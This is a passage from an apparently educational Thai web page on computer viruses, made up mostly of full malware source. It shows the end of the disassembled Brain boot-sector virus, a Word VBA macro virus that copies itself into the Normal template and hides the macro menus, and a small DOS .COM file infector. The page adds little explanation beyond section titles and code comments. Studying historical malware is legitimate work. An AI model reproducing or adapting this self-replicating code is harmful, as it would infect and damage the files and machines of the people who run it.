		mov     byte ptr ds:[7C00h+offset cursector],al
		cmp	al,0Ah
		jne     donecalc
		mov     byte ptr ds:[7C00h+offset cursector],1
		mov     al,ds:[7C00h+offset curhead]
		inc	al
		mov     ds:[7C00h+offset curhead],al
		cmp	al,2
		jne     donecalc
		mov     byte ptr ds:[7C00h+offset curhead],0
		inc     byte ptr ds:[7C00h+offset cursector+1]
donecalc:
		retn

; the following is a collection of garbage bytes
		db       00h, 00h, 00h, 00h, 32h,0E3h
		db       23h, 4Dh, 59h,0F4h,0A1h, 82h
		db      0BCh,0C3h, 12h, 00h, 7Eh, 12h
		db      0CDh, 21h,0A2h, 3Ch, 5Fh
a_data	  dw      050Ch
; Second part of the virus begins here
		jmp     short entersecondpart
		db      '(c) 1986 Brain & Amjads (pvt) Ltd ',0
readcounter     db      4		       ; keep track of # reads
curdrive	db      0
int13flag       db      0

entersecondpart:
		mov     cs:readcounter,1Fh
		xor     ax,ax
		mov     ds,ax		   ; ds -&gt; interrupt table
		mov     ax,ds:[13h*4]
		mov     ds:[6Dh*4],ax
		mov     ax,ds:[13h*4+2]
		mov     ds:[6Dh*4+2],ax
		mov     ax,offset int13	 ; 276h
		mov     ds:[13h*4],ax
		mov	ax,cs
		mov     ds:[13h*4+2],ax
		mov     cx,4		    ; 4 tries
		xor     ax,ax
		mov     es,ax		   ; es -&gt; interrupt table

tryreadbootsector:
		push	cx
		mov     dh,cs:firsthead
		mov	dl,0
		mov     cx,cs:firstsector
		mov     ax,201h		 ; read from default disk
		mov	bx,7C00h
		int     6Dh		     ; int 13h
		jnc     readbootOK
		mov	ah,0
		int     6Dh		     ; int 13h
		pop	cx
		loop    tryreadbootsector

		int     18h		     ; ROM basic on failure
readbootOK:				     ; return control to
						; original boot sector
;*	      jmp     far ptr 0000:7C00h
		db	0EAh, 00h, 7Ch, 00h, 00h
		nop			     ; MASM NOP!!!
int13:
		sti
		cmp     ah,2		    ; if not read request,
		jne     doint13		 ; do not go further
		cmp     dl,2		    ; if after second floppy,
		ja      doint13		 ; do not go further
		cmp     ch,0		    ; if not reading boot sector,
		jne     regularread	     ; go handle as usual
		cmp     dh,0		    ; if boot sector,
		je      readboot		; do I&lt;-/&gt;/\|&gt; stuff
regularread:
		dec     cs:readcounter	  ; Infect after 4 reads
		jnz     doint13		 ; If counter still OK, don't
						; do anything else
		jmp     short readboot	  ; Otherwise, try to infect
doint13:
		jmp     exitint13h
readboot:
; FINISH THIS!
		mov     cs:int13flag,0	  ; clear flag
		mov     cs:readcounter,4	; reset counter
		push	ax
		push	bx
		push	cx
		push	dx
		mov     cs:curdrive,dl
		mov	cx,4

tryreadbootblock:
		push	cx
		mov     ah,0		    ; Reset disk
		int     6Dh
		jc      errorreadingbootblock   ; Try again
		mov     dh,0
		mov	cx,1
		mov     bx,offset readbuffer    ; buffer @ 6BEh
		push	es
		mov	ax,cs
		mov	es,ax
		mov	ax,201h
		int     6Dh		     ; Read boot sector
		pop	es
		jnc     continuestuff	   ; continue if no error
errorreadingbootblock:
		pop     cx
		loop    tryreadbootblock

		jmp     short resetdisk	 ; too many failures
		nop
continuestuff:
		pop     cx		      ; get system id in boot block
		mov     ax,word ptr cs:[offset readbuffer+4]
		cmp     ax,1234h		; already infected?
		jne     dodisk		  ; if not, infect it
		mov     cs:int13flag,1	  ; flag prev. infection
		jmp     short noreset
dodisk:
		push	ds
		push	es
		mov	ax,cs
		mov	ds,ax
		mov	es,ax
		push	si
		call    writevirus	      ; infect the disk
		jc      failme		  ; exit on failure
		mov     cs:int13flag,2	  ; flag success
		call    changeroot	      ; manipulate volume label
failme:
		pop	si
		pop	es
		pop	ds
		jnc     noreset		 ; don't reset on success
resetdisk:
		mov     ah,0		    ; reset disk
		int     6Dh		     ; int 13h
noreset:
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		cmp	cx,1
		jne     exitint13h
		cmp	dh,0
		jne     exitint13h
		cmp     cs:int13flag,1	  ; already infected?
		jne     wasntinfected	   ; if wasn't, go elsewhere
		mov     cx,word ptr cs:[offset readbuffer+7]
		mov     dx,word ptr cs:[offset readbuffer+5]
		mov     dl,cs:curdrive	  ; otherwise, read real
		jmp     short exitint13h	; boot sector
wasntinfected:
		cmp     cs:int13flag,2	  ; successful infection?
		jne     exitint13h	      ; if not, just do call
		mov     cx,cs:firstsector
		mov     dh,cs:firsthead
exitint13h:
		int     6Dh		     ; int 13h
		retf    2
		db	15 dup (0)

FATManip:				       ; returns al as error code
		jmp     short delvedeeper
		nop
FATManipreadcounter dw      3
		db      ' (c) 1986 Brain & Amjads (pvt) Ltd'
delvedeeper:
		call    readFAT		 ; Get FAT ID byte
		mov     ax,word ptr ds:[offset readbuffer]
		cmp     ax,0FFFDh	       ; is it 360K disk?
		je      is360Kdisk	      ; continue if so
		mov     al,3		    ; al=3 == not good disk
		stc			     ; flag error
		retn			    ; and exit
is360Kdisk:
		mov	cx,37h
		mov     FATManipreadcounter,0   ; none found yet
checknextsector:
		call    FATentry12bit	   ; get entry in FAT
		cmp     ax,0		    ; unused?
		jne     notunused
		inc     FATManipreadcounter     ; one more found unused
		cmp     FATManipreadcounter,3   ; If need more,
		jne     tryanother	      ;  go there
		jmp     short markembad	 ; found 3 consecutive
		nop			     ; empty sectors
notunused:
		mov     FATManipreadcounter,0   ; must start over
tryanother:
		inc     cx		      ; try next sector
		cmp     cx,163h		 ; end of disk?
		jne     checknextsector	 ; if not, continue
		mov     al,1		    ; al=1 == none empty
		stc			     ; Indicate error
		retn
markembad:
		mov     dl,3		    ; 3 times
markanotherbad:
		call    markbad12bit
		dec	cx
		dec	dl
		jnz     markanotherbad
		inc	cx
		call    calc1sttrack
		call    writeFAT		; update FAT
		mov     al,0		    ; al=0 == ok
		clc			     ; indicate success
		retn

markbad12bit:
		push    cx
		push	dx
		mov     si,offset readbuffer    ; si -&gt; buffer
		mov	al,cl
		shr     al,1
		jc      low_12		  ; low bits
		call    clus2offset12bit
		mov     ax,[bx+si]	      ; get FAT entry
		and     ax,0F000h	       ; mark it bad
		or	ax,0FF7h
		jmp     short putitback	 ; and put it back
		nop
low_12:
		call    clus2offset12bit
		mov     ax,[bx+si]	      ; get FAT entry
		and     ax,0Fh		  ; mark it bad
		or	ax,0FF70h
putitback:
		mov     [bx+si],ax	      ; replace FAT entry
		mov     word ptr ds:[400h][bx+si],ax ; in two places
		pop	dx
		pop	cx
		retn

FATentry12bit:
		push	cx
		mov     si,offset readbuffer    ; si-&gt;buffer
		mov	al,cl
		shr     al,1
; Part 3 of the virus starts here
		jc      want_high_12
		call    clus2offset12bit
		mov	ax,[bx+si]
		and     ax,0FFFh
		jmp     short exitFATentry12bit
		nop
want_high_12:
		call    clus2offset12bit	; xxxxxxxxxxxx0000
		mov     ax,[bx+si]	      ; ^^^^^^^^^^^^wanted
		and     ax,0FFF0h	       ; mask wanted bits
		mov     cl,4		    ; and move to correct
		shr     ax,cl		   ; position
exitFATentry12bit:
		pop	cx
		retn

clus2offset12bit:
		push	dx
		mov     ax,3
		mul     cx
		shr     ax,1		    ; ax = cx*1.5
		mov	bx,ax
		pop	dx
		retn

readFAT:
		mov     ah,2		    ; read
		call    FAT_IO
		retn

writeFAT:
		mov     ah,3		    ; write
		call    FAT_IO
		retn

FAT_IO:
		mov     cx,4		    ; try four times
FAT_IOLoop:
		push	cx
		push	ax
		mov     ah,0		    ; reset disk
		int     6Dh		     ; int 13h
		pop	ax
		jc      tryFAT_IOagain
		mov     bx,offset readbuffer
		mov     al,4		    ; 4 sectors
		mov     dh,0		    ; head 0
		mov     dl,curdrive
		mov     cx,2		    ; sector 2
		push    ax		      ; (FAT)
		int     6Dh		     ; int 13h
		pop	ax
		jnc     exitFAT_IO
tryFAT_IOagain:
		pop	cx
		loop    FAT_IOLoop

		pop	ax
		pop	ax
		mov	al,2
		stc			     ; mark error
		retn
exitFAT_IO:
		pop	cx
		retn

calc1sttrack:
		push	cx
		sub     cx,2
		shl     cx,1		    ; 2 sectors/cluster
		add     cx,0Ch		  ; start of data area
		mov     ax,cx		   ; ax = sector
		mov     cl,12h		  ; 4096
		div     cl		      ; ax/4096 = al rem ah
		mov     byte ptr firstsector+1,al
		mov     firsthead,0
		inc	ah
		cmp     ah,9		    ; past track 9?
		jbe     notpasttrack9	   ; nope, we are ok
		sub     ah,9		    ; otherwise, adjust
		mov     firsthead,1
notpasttrack9:
		mov     byte ptr firstsector,ah
		pop	cx
		retn

		db      0, 0, 0, 0, 0, 0
r_or_w_root     db      3
entrycount      dw      35h

tempsave1       dw      303h
tempsave2       dw      0EBEh
tempsave3       dw      1
tempsave4       dw      100h
		db	0E0h,0D8h, 9Dh,0D7h,0E0h, 9Fh
		db	 8Dh, 98h, 9Fh, 8Eh,0E0h
		db	' (c) ashar $'
changeroot:
		call    readroot		; read in root directory
		jc      donotchangeroot
		push	di
		call    changevolume	    ; change volume label
		pop	di
		jc      donotchangeroot
		call    writeroot	       ; write back new root dir
donotchangeroot:
		retn
; The following is just garbage bytes
		db	0BBh, 9Bh, 04h,0B9h, 0Bh
		db      0,8Ah,7,0F6h,0D8h,88h,4,46h,43h
		db      0E2h,0F6h,0B0h,8,88h,4,0F8h,0C3h
		db      0C6h, 06h

changevolume:
		mov     entrycount,6Ch
		mov     si,offset readbuffer+40h; 3nd dir entry
		mov     tempsave1,dx
		mov     ax,entrycount	   ; 6Ch
		shr     ax,1
		mov     tempsave3,ax	    ; 36h
		shr     ax,1
		mov     tempsave2,ax	    ; 1Bh
		xchg    ax,cx
		and     cl,43h		  ; cx = 3
		mov     di,tempsave2
		add     di,1E3h		 ; di = 01FE
findlabel:
		mov	al,[si]
		cmp	al,0
		je      dolabel		 ; no mo entries
		mov     al,[si+0Bh]	     ; attribute byte
		and     al,8		    ; volume label?
		cmp     al,8		    ; yes?
		je      dolabel		 ; then change it!
		add     si,20h		  ; go to next directory entry
		dec     entrycount
		jnz     findlabel	       ; loop back
		stc			     ; Error!
		retn
		db	8Bh
dolabel:
		mov     bx,[di]		 ; offset a_data
		xor     bx,tempsave3	    ; bx = 53Ah
		mov     tempsave3,si	    ; si-&gt;direntry
		cli
		mov	ax,ss
		mov     tempsave1,ax
		mov     tempsave2,sp
		mov	ax,cs
		mov	ss,ax
		mov     sp,tempsave3
		add     sp,0Ch		  ;-&gt;reserved area
		mov     cl,51h
		add	dx,444Ch
		mov     di,2555h
		mov	cx,0C03h
		repe    cmpsw
		mov     ax,0B46h
		mov	cx,3
		rol     ax,cl		   ; ax = 5A30h
		mov     tempsave3,ax
		mov	cx,5
		mov	dx,8
		sub     tempsave3,5210h	 ; 820h
		push    tempsave3	       ; store attributes/reserved
; I haven't commented the remainder of this procedure.
; It basically changes the volume label to read "(c) Brain"

; Comment mode OFF

dowhatever:
		mov     ah,[bx]		 ; 5a3h
		inc	bx
		mov     dl,ah
		shl     dl,1
		jc      dowhatever
searchstuff:
		mov     dl,[bx]		 ; dl=C2h
		inc     bx		      ; bx=53Eh
		mov     al,dl
		shl     dl,1
		jc      searchstuff
		add	ax,1D1Dh
		push	ax
		inc     tempsave3
		db       73h, 01h	       ; jnc $+3
		db      0EAh,0E2h,0E1h, 8Bh, 26h; jmp 268B:E1E2
		xchg    bp,ax
		add     al,0A1h
		xchg    bx,ax
		add     al,8Eh
		sar     bl,1
		add     dh,[bp+si]
		clc
		ret
		;db       95h, 04h,0A1h, 93h, 04h, 8Eh
		;db      0D0h,0FBh, 02h, 32h,0F8h,0C3h

; Comment mode ON

readroot:
		mov     r_or_w_root,2	   ; set action code
		jmp     short do_rw_root	; easier to do w/
		nop			     ; mov ah, 2
writeroot:
		mov     r_or_w_root,3
		jmp     short do_rw_root	; this is somewhat useless
		nop
do_rw_root:
		mov     dh,0		    ; head 0
		mov     dl,curdrive
		mov     cx,6		    ; sector 6
		mov     ah,r_or_w_root
		mov     al,4		    ; 4 sectors
		mov     bx,offset readbuffer
		call    doint13h
		jc      exit_rw_root	    ; quit on error
		mov	cx,1
		mov     dh,1		    ; head 1
		mov     ah,r_or_w_root
		mov	al,3
		add	bx,800h
		call    doint13h

exit_rw_root:
		retn

doint13h:
		mov     tempsave1,ax
		mov     tempsave2,bx
		mov     tempsave3,cx
		mov     tempsave4,dx
		mov	cx,4

doint13hloop:
		push	cx
		mov     ah,0		    ; Reset disk
		int     6Dh
		jc      errordoingint13h
		mov     ax,tempsave1
		mov     bx,tempsave2
		mov     cx,tempsave3
		mov     dx,tempsave4
		int     6Dh		     ; int 13h
		jnc     int13hsuccess
errordoingint13h:
		pop	cx
		loop    doint13hloop

		stc			     ; indicate error
		retn
int13hsuccess:
		pop	cx
		retn

		db	0, 0, 0
; Part 4 of the virus starts here
tempstorecx     dw      3
readwritecurrentdata    dw      301h

writevirus:
		call    FATManip
		jc      exitwritevirus
		mov     cursector,1
		mov     curhead,0
		mov     bx,offset readbuffer
		call    readcurrent
		mov     bx,offset readbuffer
		mov     ax,firstsector
		mov     cursector,ax
		mov     ah,firsthead
		mov     curhead,ah
		call    writecurrent
		call    calcnextsector
		mov	cx,5
		mov	bx,200h
writeanothersector:
		mov     tempstorecx,cx
		call    writecurrent
		call    calcnextsector
		add	bx,200h
		mov     cx,tempstorecx
		loop    writeanothersector

		mov     curhead,0
		mov     cursector,1
		mov	bx,0
		call    writecurrent
		clc			     ; indicate success
exitwritevirus:
		retn


readcurrent:
		mov     readwritecurrentdata,201h
		jmp     short doreadwrite
		nop
writecurrent:
		mov     readwritecurrentdata,301h
		jmp     short doreadwrite       ; This is pointless.
		nop
doreadwrite:
		push	bx
		mov	cx,4

tryreadwriteagain:
		push	cx
		mov     dh,curhead
		mov     dl,curdrive
		mov     cx,cursector
		mov     ax,readwritecurrentdata ; read or write?
		int     6Dh		     ; int 13h
		jnc     readwritesuccessful
		mov     ah,0		    ; reset disk
		int     6Dh		     ; int 13h
		pop	cx
		loop    tryreadwriteagain

		pop	bx
		pop	bx
		stc			     ; Indicate error
		retn
readwritesuccessful:
		pop	cx
		pop	bx
		retn


calcnextsector:
		inc     byte ptr cursector      ; next sector
		cmp     byte ptr cursector,0Ah
		jne     donecalculate	   ; finished calculations
		mov     byte ptr cursector,1    ; clear sector #
		inc     curhead		 ; and go to next head
		cmp     curhead,2	       ; if not too large,
		jne     donecalculate	   ; we are done
		mov     curhead,0	       ; otherwise clear head #
		inc     byte ptr cursector+1    ; and advance cylinder
donecalculate:
		retn

		db	 64h, 74h, 61h

; read buffer starts here
; insert your favorite boot block below...
readbuffer:
brain	   ends
		end




					</pre>
					<br><a href=#main>กลับสู่หน้าหลัก</a>
				</td>
			</tr>
		</table>
	</center>
	<br>
	<center>
		<table>
			<tr>
				<td>
 					<h1 id='Menu13'>
10. ทำความเข้าใจ Macro Virus
					</h1>
				</td>
			</tr>
			<tr>
				<td>
					<pre>
Sub VirusDocument(Copy As Boolean)
    OK = True
    For Each Obj In IIf(Copy, NormalTemplate, ActiveDocument).VBProject.VBComponents
	If Obj.Name = "ไวรัส" Then OK = False
	If Obj.Name &lt;&gt; "ไวรัส" And Obj.Name &lt;&gt; "ThisDocument" Then
	    Application.OrganizerDelete IIf(Copy, NormalTemplate, ActiveDocument).FullName, Obj.Name, wdOrganizerObjectProjectItems
	End If
    Next Obj
    If OK Then
	Application.OrganizerCopy IIf(Copy, ActiveDocument, NormalTemplate).FullName, IIf(Copy, NormalTemplate, ActiveDocument).FullName, "ไวรัส", wdOrganizerObjectProjectItems
	Application.DisplayRecentFiles = False
	Application.DisplayRecentFiles = True
    End If
End Sub

Sub FileOpen()
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen) &lt;&gt; 0 Then
	VirusDocument False
	ActiveDocument Save
    End If
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoClose()
    VirusDocument False
End Sub

Sub FileClose()
    VirusDocument False
End Sub

Sub FileSave()
    If ActiveDocument.Saved = False Then
	VirusDocument False
	On Error Resume Next
	ActiveDocument.Save
    End If
End Sub

Sub ToolsMacro()
    MsgBox "ไม่สามารถใช้เมนูนี้ได้..."
End Sub

Sub ViewVBCode()
    ToolsMacro
End Sub

Sub FileTemplates()
    ToolsMacro
End Sub
	
					</pre>
					<br><a href=#main>กลับสู่หน้าหลัก</a>
				</td>
			</tr>
		</table>
	</center>
	<br>
	<center>
		<table>
			<tr>
				<td>
 					<h1 id='Menu14'>
11. ทำความเข้าใจ Program Virus
					</h1>
				</td>
			</tr>
			<tr>
				<td>
					<pre>
	PAGE	,132
tinyv   SEGMENT BYTE PUBLIC 'code'
	ASSUME  CS:tinyv
	ASSUME  SS:tinyv
	ASSUME  DS:tinyv
H00000	DB	0
H00001	DB	255 DUP(?)
program  PROC    FAR
	ASSUME  ES:tinyv
begin:
	JMP     pgstart		 ; start program
exlbl   LABEL   BYTE
	db      0CDh, 20h, 7, 8, 9
pgstart:
	CALL    tinyvir
mnprg   PROC    NEAR
tinyvir:
	POP     SI		      ; get SI for storage
	SUB     SI,offset tinyvir       ; reset SI to virus start
	MOV     BP,[SI+blnkdat]	 ; store SI in BP for return
	ADD     BP,offset exlbl	 ; Add to get original offset

	LEA     DX,[SI+fspec]	   ; get filespec (*.COM)
	SUB     CX,CX		   ;	||    (clear regs)
	MOV     AH,4EH		  ;	||   (find files)
mainloop:			       ;       \||/
	INT     21H		     ;    ----\/----
	JC      hiccup		  ; no more files found, terminate virus
	MOV     DX,009EH		; set file name pointer
	MOV     AX,3D02H		; open file
	INT     21H		     ; do it!
	MOV     BX,AX		   ; move file handle to BX
	MOV     AH,3FH		  ; read file
	LEA     DX,[SI+endprog]	 ; load end of program (as buffer pntr)
	MOV     DI,DX		   ; set Dest Index to area for buffer (?)
	MOV     CX,0003H		; read 3 bytes
	INT     21H		     ; do it!
	CMP     BYTE PTR [DI],0E9H      ; check for JMP at start
	JE      infect		  ; If begins w/JMP, Infect
nextfile:
	MOV     AH,4FH		  ; set int 21 to find next file
	JMP     mainloop		; next file, do it!
hiccup: JMP     nofile
infect:
	MOV     AX,5700h		; get date function
	INT     21h		     ; do it!
	PUSH    DX		      ; store date + time
	PUSH    CX
	MOV     DX,[DI+01H]	     ; set # of bytes to move
	MOV     [SI+blnkdat],DX	 ;  "  " "    "   "   "
	SUB     CX,CX		   ;  "  " "    "   "   " (0 here)
	MOV     AX,4200H		; move file
	INT     21H		     ; do it!
	MOV     DX,DI		   ; set dest index to area for buffer (?)
	MOV     CX,0002H		; two bytes
	MOV     AH,3FH		  ; read file
	INT     21H		     ; do it!
	CMP     WORD PTR [DI],0807H     ; check for infection
	JE      nextfile		; next file if infected
	SUB     DX,DX		   ; clear regs
	SUB     CX,CX		   ;   "    "
	MOV     AX,4202H		; move file pointer
	INT     21H		     ; do it!
	CMP     DX,00H		  ; new pointer location 0?
	JNE     nextfile		; if no then next file
	CMP     AH,0FEH		 ; new pointer loc too high?
	JNC     nextfile		; yes, try again
	MOV     [SI+offset endprog+3],AX; point to data
	MOV     AH,40H		  ; write instruction
	LEA     DX,[SI+0105H]	   ; write buffer loc    |
	MOV     CX,offset endprog-105h  ; (size of virus)  --\|/--
	INT     21H		     ; do it!
	JC      exit		    ; error, bug out
	MOV     AX,4200H		; move pointer
	SUB     CX,CX		   ; clear reg
	MOV     DX,OFFSET H00001	; where to set pointer
	INT     21H		     ; do it!
	MOV     AH,40H		  ; write to file
	LEA     DX,[SI+offset endprog+3]; write data at SI+1AB
	MOV     CX,0002H		; two bytes (the JMP)
	INT     21H		     ; do it!
	MOV     AX,5701h		; store date
	POP     CX		      ; restore time
	POP     DX		      ; restore date
	INT     21h		     ; do it!
exit:
	MOV     AH,3EH		  ; close file
	INT     21H		     ; do it!
nofile:

	JMP     BP		      ; go to original file
mnprg   ENDP
program  ENDP
blnkdat LABEL   WORD
	DW      0000H
fspec   LABEL   WORD
	DB      '*.COM'
	DB	0
endprog LABEL   WORD
tinyv   ENDS
	END     program
					</pre>
					<br><a href=#main>กลับสู่หน้าหลัก</a>
				</td>
			</tr>
		</table>
	</center>
	<br>

</body>